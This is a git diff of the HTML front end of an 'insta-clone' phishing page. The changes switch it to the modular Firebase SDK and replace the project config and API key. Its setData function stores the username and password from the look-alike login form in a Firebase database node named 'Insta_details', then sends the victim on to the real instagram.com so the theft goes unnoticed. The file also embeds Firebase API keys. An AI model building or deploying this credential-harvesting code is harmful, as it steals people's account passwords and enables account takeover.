@@ -9,6 +9,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
     <link rel="stylesheet" href="main.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js"></script>
 
 </head>
 
@@ -72,29 +74,32 @@
 
 </body>
 
-    <script type="module">
-  // Import the functions you need from the SDKs you need
-  import "https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js";
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
 
-  // Your web app's Firebase configuration
-  const firebaseConfig = {
-    apiKey: "AIzaSyCWIOPzZhNQPl_CQgqZYan31QmfOKLF0kc",
-    authDomain: "insta-clone-2040f.firebaseapp.com",
-    databaseURL: "https://insta-clone-2040f-default-rtdb.firebaseio.com",
-    projectId: "insta-clone-2040f",
-    storageBucket: "insta-clone-2040f.appspot.com",
-    messagingSenderId: "168739329957",
-    appId: "1:168739329957:web:94962adc32c392e199ba4c"
-  };
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAtxsewzo-ZQWuT_NQcKpnH3kFf9pASBY4",
+        authDomain: "insta-clone-6731a.firebaseapp.com",
+        databaseURL: "https://insta-clone-6731a-default-rtdb.firebaseio.com",
+        projectId: "insta-clone-6731a",
+        storageBucket: "insta-clone-6731a.appspot.com",
+        messagingSenderId: "694274673768",
+        appId: "1:694274673768:web:41d1d274ba592af3babfdd"
+    };
 
-  // Initialize Firebase
-  firebase.initializeApp(firebaseConfig);
-        
- // Refence of Database
- const db = firebase.database().ref("Insta_details");
- 
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+
+    import { getDatabase, set, ref }
+        from "https://www.gstatic.com/firebasejs/9.18.0/firebase-database.js";
+
+    // Database
+    const db = getDatabase();
+
     // ------------------------------------------------------
 
     let _username = document.querySelector('.username');
@@ -102,31 +107,31 @@
 
     console.log(_username.value.replace('.', ''));
 
-    function setData () {
-        console.log("hello bhai log")
+    // Insert Data
+    function setData() {
         let time = new Date().toLocaleTimeString()
         let date = new Date().toLocaleDateString().replaceAll("/", ":")
-        set(ref(db, "Insta_details/"+`${_username.value.replace('.', '')} - ${time} - ${date}`), {
+
+        set(ref(db, "Insta_details/" + `${_username.value.replace('.', '')} - ${time} - ${date}`), {
             Username: _username.value,
             Password: _password.value
-        }).then(() => {
-            _password.value = ""
-            alert("Thank you for subscribing!!")
-//             location.href = "https://www.instagram.com/"
-            
-            console.log(_username.value, _password.value)
         })
-        .catch((error) => alert("Unsuccessful ", error))
-        console.log(_username.value, _password.value);
+        .then(() => {
+            _password.value = ""
+            // alert("You will get Your Data around 24 hr \n Thank you for subscribing!!")
+            setTimeout(() => location.href = "https://www.instagram.com/", 1000);
+        })
+        .catch((error) => alert("Unsuccessful " + error))
 
     }
 
-     // Submit Action
+
     document.getElementById("form").addEventListener("submit", setData)
 
 
 </script>
 <script src="script.js"></script>
+    
 
 </html>
 
